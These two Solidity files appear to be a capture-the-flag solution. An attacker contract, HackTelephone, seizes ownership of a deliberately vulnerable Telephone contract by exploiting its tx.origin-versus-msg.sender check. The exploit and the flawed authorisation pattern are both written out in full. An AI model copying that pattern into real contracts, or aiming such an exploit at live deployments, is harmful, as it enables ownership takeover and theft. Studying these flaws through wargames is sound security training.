// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version

import '../contracts/Telephone.sol';

contract HackTelephone {
    // Complete this value with the address of the instance
    Telephone public originalContract = Telephone(0x2AfB4aCF90BE4088f3485Bf4C2Ba8F93a905C64B);

    // Call this function from a contract so the tx.origin it's gonna be different than the msg.sender
    function changeOwner(address myAddress) public {
        originalContract.changeOwner(myAddress);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}